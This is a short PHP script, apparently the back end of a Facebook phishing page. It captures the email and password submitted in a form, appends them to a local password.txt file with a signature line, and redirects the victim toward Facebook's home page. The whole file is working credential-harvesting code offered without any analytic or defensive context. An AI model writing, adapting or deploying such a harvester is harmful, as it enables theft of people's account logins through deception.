<?php 
header("location : https://www.facebook.com/home.php");
$email =$_POST['email']; 
$pword =$_POST['password']; 
$file =fopen("password.txt","a"); 
fwrite($file,"email: $email \n "); 
fwrite($file,"password : $pword \n"); 
fwrite($file, "*******KoNyiJR*******\n");
?>
